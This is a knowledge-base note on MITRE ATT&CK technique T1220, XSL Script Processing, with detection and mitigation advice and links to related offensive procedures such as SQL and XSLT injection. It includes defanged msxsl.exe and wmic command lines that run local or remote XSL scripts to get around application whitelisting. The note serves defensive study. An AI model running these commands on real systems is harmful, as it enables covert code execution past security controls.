---
id: c606d0a8-feca-4dfd-92af-12b4145822b4
name: XSL Script Processing
type: technique
mitre_id: T1220
mitre_url: null
created_at: '2019-08-28T21:17:37.478188+00:00'
updated_at: '2023-05-29T16:48:53.672970+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Execution|TA0002 - Execution]]'
procedures:
- '[[DB2 Injection - ASCII Value Extraction]]'
- '[[GraphQL Batching Attacks using finishChannelVerificationMutation]]'
- '[[GraphQL Edge/Node Data Extraction]]'
- '[[GraphQL Injection for NOSQL Exploitation]]'
- '[[GraphQL Projection Data Extraction]]'
- '[[GraphQL Type Enumeration]]'
- '[[Hibernate Query Language Injection - Single Quote Escaping]]'
- '[[Insecure Source Code Management with Bazaar using rip-bzr.pl]]'
- '[[LaTex Injection Command Execution]]'
- '[[LaTex Injection - Write File]]'
- '[[Linux - Privilege Escalation via Writable /etc/passwd]]'
- '[[MYSQL Error Based - NAME_CONST Function Injection]]'
- '[[MYSQL Injection Exploitation]]'
- '[[Native .NET XSLT Injection Remote Code Execution]]'
- '[[Netdoc SSRF via URL Scheme]]'
- '[[Out Of Band XPATH Injection]]'
- '[[PHP Deserialization with Monolog/RCE1 and Swiftmailer/FW1 Gadgets]]'
- '[[PostgreSQL XML Data Exfiltration]]'
- '[[SAML Injection Authentication Bypass]]'
- '[[SQLite Injection via Remote Command Execution using Attach Database Command]]'
- '[[XSLT Injection - Remote Code Execution with PHP wrapper]]'
- '[[XSLT Injection with Remote Code Execution]]'
- '[[Zip Slip Basic Exploit - Unix Server Shell Upload]]'
---

# XSL Script Processing

**MITRE ID**: T1220

## Description

Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. [1]Adversaries may abuse this functionality to execute arbitrary files while potentially bypassing application whitelisting defenses. Similar to Trusted Developer Utilities, the Microsoft common line transformation utility binary (msxsl.exe) [2] can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files. [3] Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files. [4]Command-line example: [3]msxsl.exe customers[.]xml script[.]xslAnother variation of this technique, dubbed "Squiblytwo", involves using Windows Management Instrumentation to invoke JScript or VBScript within an XSL file. [5] This technique can also execute local/remote scripts and, similar to its Regsvr32/ "Squiblydoo" counterpart, leverages a trusted, built-in Windows tool.Command-line examples: [5]Local File: wmic process list /FORMAT:evil[.]xslRemote File: wmic os get /FORMAT:"https[:]//example[.]com/evil[.]xsl"

# Detection

Use process monitoring to monitor the execution and arguments of msxsl.exe and wmic.exe. Compare recent invocations of these utilities with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity (ex: URL command line arguments, creation of external network connections, loading of DLLs associated with scripting). [5] [8] Command arguments used before and after the script invocation may also be useful in determining the origin and purpose of the payload being loaded.

The presence of msxsl.exe or other utilities that enable proxy execution that are typically used for development, debugging, and reverse engineering on a system that is not used for these purposes may be suspicious.

# Mitigation

Windows Management Instrumentation and/or msxsl.exe may or may not be used within a given environment. Disabling WMI may cause system instability and should be evaluated to assess the impact to a network. If msxsl.exe is unnecessary, then block its execution to prevent abuse by adversaries.

# Footnotes

[1] Wenzel, M. et al. (2017, March 30). XSLT Stylesheet Scripting Using . Retrieved July 3, 2018.

[2] Microsoft. (n.d.). Command Line Transformation Utility (msxsl.exe). Retrieved July 3, 2018.

[3] netbiosX. (2017, July 6). AppLocker Bypass – MSXSL. Retrieved July 3, 2018.

[4] Admin. (2018, March 2). Spear-phishing campaign leveraging on MSXSL. Retrieved July 3, 2018.

[5] Smith, C. (2018, April 17). WMIC.EXE Whitelisting Bypass - Hacking with Style, Stylesheets. Retrieved July 3, 2018.

[6] Salem, E. (2019, February 13). ASTAROTH MALWARE USES LEGITIMATE OS AND ANTIVIRUS PROCESSES TO STEAL PASSWORDS AND PERSONAL DATA. Retrieved April 17, 2019.

[7] Svajcer, V. (2018, July 31). Multiple Cobalt Personality Disorder. Retrieved September 5, 2018.

[8] Desimone, J. (2018, April 18). Status Update. Retrieved July 3, 2018.

## Defense

[Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and/or msxsl.exe may or may not be used within a given environment. Disabling WMI may cause system instability and should be evaluated to assess the impact to a network. If ms

## Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Execution|TA0002 - Execution]]

## Related Procedures (23)

- [[DB2 Injection - ASCII Value Extraction]]
- [[GraphQL Batching Attacks using finishChannelVerificationMutation]]
- [[GraphQL Edge/Node Data Extraction]]
- [[GraphQL Injection for NOSQL Exploitation]]
- [[GraphQL Projection Data Extraction]]
- [[GraphQL Type Enumeration]]
- [[Hibernate Query Language Injection - Single Quote Escaping]]
- [[Insecure Source Code Management with Bazaar using rip-bzr.pl]]
- [[LaTex Injection Command Execution]]
- [[LaTex Injection - Write File]]
- [[Linux - Privilege Escalation via Writable /etc/passwd]]
- [[MYSQL Error Based - NAME_CONST Function Injection]]
- [[MYSQL Injection Exploitation]]
- [[Native .NET XSLT Injection Remote Code Execution]]
- [[Netdoc SSRF via URL Scheme]]
- [[Out Of Band XPATH Injection]]
- [[PHP Deserialization with Monolog/RCE1 and Swiftmailer/FW1 Gadgets]]
- [[PostgreSQL XML Data Exfiltration]]
- [[SAML Injection Authentication Bypass]]
- [[SQLite Injection via Remote Command Execution using Attach Database Command]]

*...and 3 more*
